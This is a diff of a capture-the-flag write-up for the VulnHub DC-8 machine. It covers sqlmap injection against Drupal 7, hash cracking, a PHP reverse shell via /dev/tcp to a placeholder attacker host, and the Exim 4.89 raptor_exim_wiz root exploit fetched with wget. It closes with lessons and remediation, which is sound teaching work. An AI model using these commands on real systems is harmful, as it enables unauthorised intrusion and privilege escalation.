@@ -1,152 +1,165 @@
 # DC: 8 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.0.6 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.x (DHCP; discover with netdiscover) |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | /root/flag.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/dc-8,367/) |
+| **Goal** | Read `/root/flag.txt` |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/dc8-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → Drupal 7 SQLi (sqlmap) → dump users table → john cracks password → PHP form code injection → reverse shell (www-data) → Exim 4.89 LPE (raptor_exim_wiz.sh) → root
+Exploit a SQL injection vulnerability in a Drupal 7 site to dump the user table with sqlmap, crack the recovered hash with John the Ripper, log in to Drupal as `john`, abuse the PHP text filter to execute a reverse shell as `www-data`, then escalate to root by exploiting a SUID Exim 4.89 binary with a public local privilege escalation script.
 
 ## Methodology
 
-1. Network discovery
-2. Drupal SQL injection with sqlmap
-3. Password cracking with john
-4. PHP code injection via Drupal form settings
-5. Privilege escalation via Exim 4.89 (CVE-2019-10149)
+1. Reconnaissance (netdiscover + nmap)
+2. Web enumeration (Drupal 7, SQL injection discovery)
+3. Exploitation (sqlmap, hash cracking, Drupal PHP code execution)
+4. Privilege escalation (Exim 4.89 SUID — CVE-2019-10149 / raptor_exim_wiz)
 
----
-
-## Step 1: Network Discovery
+## Step 1: Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.0.0/24
-nmap -A 192.168.0.6
+netdiscover -r 192.168.1.0/24
 ```
 
-Findings: port 22 (SSH), port 80 (Apache — Drupal 7).
+Note the target IP.
 
-![Nmap results](images/01-nmap.png)
-
----
-
-## Step 2: SQL Injection via sqlmap
-
-A single quote `'` on a page parameter produces a Drupal SQL error, confirming injection.
+## Step 2: Reconnaissance
 
 ```bash
-sqlmap -u "http://192.168.0.6/?nid=2" --dbs --batch --risk 3 --level 5
-# Finds: d7db, information_schema
-
-sqlmap -u "http://192.168.0.6/?nid=2" -D d7db --tables --batch --risk 3 --level 5
-# Finds: users table
-
-sqlmap -u "http://192.168.0.6/?nid=2" -D d7db -T users --dump --batch --risk 3 --level 5
-# Dumps: admin and john's hashed passwords
+nmap -A <TARGET_IP>
 ```
 
-![sqlmap dump](images/02-sqli.png)
+![Nmap scan](images/01-nmap.png)
 
-Save hashes to a file:
+Key open ports:
+
+| Port | Service | Notes |
+|------|---------|-------|
+| 22   | OpenSSH | |
+| 80   | Apache  | Drupal 7 application |
+
+## Step 3: Identify SQL Injection
+
+Browse to `http://<TARGET_IP>/`. The left-side navigation links include a `nid` parameter. Append a single quote to test:
+
+```
+http://<TARGET_IP>/?nid=1'
+```
+
+A Drupal database error is returned, confirming SQL injection.
+
+![SQL injection discovery](images/02-enum.png)
+
+## Step 4: Database Enumeration with sqlmap
+
 ```bash
-cat hashes.txt
-# admin:$D2tRcYRyqVFNSCONVYUrYeQbLQg5koMKtihYTIDC9QQ...
-# john:$S$DqupvJbxVmqjr6cYePnx2A8911Ln7lsuku/3if/oRVZJaz5mKC2vF
+sqlmap -u "http://<TARGET_IP>/?nid=1" --dbs --risk 3 --level 5 --batch
 ```
 
----
-
-## Step 3: Password Cracking
+The `d7db` database is found. Dump the `users` table:
 
 ```bash
-john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
-john hashes.txt --show
-# john:turtle
+sqlmap -u "http://<TARGET_IP>/?nid=1" -D d7db -T users --dump --risk 3 --level 5 --batch
 ```
 
----
+Two password hashes are extracted. Crack them with John the Ripper:
 
-## Step 4: PHP Reverse Shell via Drupal Form
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+# john: password "turtle" for user "john"
+```
 
-1. Log in to `http://192.168.0.6/user` as `john:turtle`
-2. Navigate to **Structure → Webform → Contact → Form settings**
-3. Change the text format to **PHP code**
-4. Replace the form content with a PHP reverse shell:
+## Step 5: Login to Drupal and Execute PHP
+
+Navigate to `http://<TARGET_IP>/user` and log in as `john:turtle`.
+
+Go to **Configuration > Content authoring > Text formats**. Edit the "Full HTML" format and switch the PHP filter to enabled. Navigate to a content node's edit page and change the text format to **PHP code**. Replace the body with a PHP reverse shell:
 
 ```php
-<?php system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/1234 0>&1'"); ?>
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'");
+?>
 ```
 
-5. Start listener:
-```bash
-nc -lvnp 1234
-```
-
-6. Submit the form to trigger execution → receive `www-data` shell.
+Start a listener:
 
 ```bash
-# Stabilize shell
-python -c 'import pty;pty.spawn("/bin/bash")'
+nc -lvnp <LPORT>
 ```
 
-![PHP reverse shell](images/03-php-shell.png)
+Save or preview the node to trigger execution. A `www-data` shell connects back.
 
----
-
-## Step 5: Exim 4.89 LPE — CVE-2019-10149
+Upgrade the shell:
 
 ```bash
-find / -perm -u=s -type f 2>/dev/null
-exim --version | head -1
-# exim 4.89 — vulnerable to CVE-2019-10149 (raptor_exim_wiz)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-On attacker machine:
+![Exploitation — Drupal PHP RCE](images/03-exploit.png)
+
+## Step 6: Identify Exim for Privilege Escalation
+
+Check for SUID binaries and the Exim version:
+
 ```bash
-wget https://raw.githubusercontent.com/Ridter/exp-edb-47
-python3 -m http.server 8000
-nc -lvnp 4444
+find / -perm -4000 -type f 2>/dev/null
+exim --version
+# Exim version 4.89
 ```
 
-On victim (`www-data`):
+Exim 4.89 is vulnerable to a local privilege escalation (CVE-2019-10149 / `raptor_exim_wiz`).
+
+## Step 7: Exploit Exim with raptor_exim_wiz
+
+Download the exploit to `/tmp`:
+
 ```bash
-cd /tmp
-wget http://<ATTACKER_IP>:8000/raptor_exim_wiz.sh
-chmod 777 raptor_exim_wiz.sh
-./raptor_exim_wiz.sh -m netcat
-# Callback arrives on port 4444 as root
+wget https://raw.githubusercontent.com/AV1080p/Hackthebox-Writeups/master/raptor_exim_wiz.sh \
+  -O /tmp/raptor_exim_wiz.sh
+chmod +x /tmp/raptor_exim_wiz.sh
 ```
 
-![Exim exploit](images/04-exim.png)
+Run with the netcat payload option:
+
+```bash
+/tmp/raptor_exim_wiz.sh -m netcat
+```
+
+Wait for the root reverse shell to connect on your listener.
 
 ```bash
 id
-# uid=0(root)
-cd /root
-cat flag.txt
+# uid=0(root) gid=0(root)
 ```
 
-![Root flag](images/05-root.png)
+![Privilege escalation — Exim SUID](images/04-privesc.png)
 
----
+## Step 8: Root Flag
+
+```bash
+cat /root/flag.txt
+```
+
+![Root flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **Drupal SQLi** — `?nid=` parameter not sanitized; use parameterized queries and keep Drupal patched
-2. **Weak passwords in CMS** — `turtle` is in rockyou.txt; enforce password complexity
-3. **PHP code execution in CMS forms** — never allow PHP as a text format; restrict to HTML/Markdown
-4. **Exim 4.89 LPE (CVE-2019-10149)** — affects Exim < 4.92; upgrade immediately and restrict SUID services
+1. Drupal's PHP filter is a dangerous feature: enabling PHP evaluation in text fields turns any authenticated content editor into a remote code execution capability.
+2. SQL injection in a CMS URL parameter (`nid`) can expose the entire database, including password hashes.
+3. SUID binaries running as root must be kept patched — Exim 4.89 is a well-known local privilege escalation vector.
+4. Drupal and other CMS platforms require regular updates; outdated versions accumulate critical vulnerabilities.
+5. Using `sqlmap --risk 3 --level 5` is aggressive and may cause DoS or data corruption on production systems — always operate within authorized scope.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Drupal SQL injection | Update Drupal; use parameterized queries; WAF for SQLi patterns |
-| Weak CMS passwords | Enforce complexity; enable 2FA on admin accounts |
-| PHP code in form fields | Disable PHP text format in Drupal; allow only safe formats |
-| Exim 4.89 LPE (CVE-2019-10149) | Upgrade Exim to ≥ 4.92; patch or remove if unused |
+|---|---|
+| SQL injection (Drupal nid) | Upgrade Drupal to a patched version; use parameterized queries |
+| PHP text filter enabled | Disable the PHP evaluation filter in Drupal text formats |
+| Weak admin password (turtle) | Enforce strong password policies; use a password manager |
+| Exim 4.89 SUID (CVE-2019-10149) | Upgrade Exim to the latest patched version; remove unnecessary SUID bits |
+| www-data shell upgrade | Restrict outbound network access from web server processes via firewall rules |
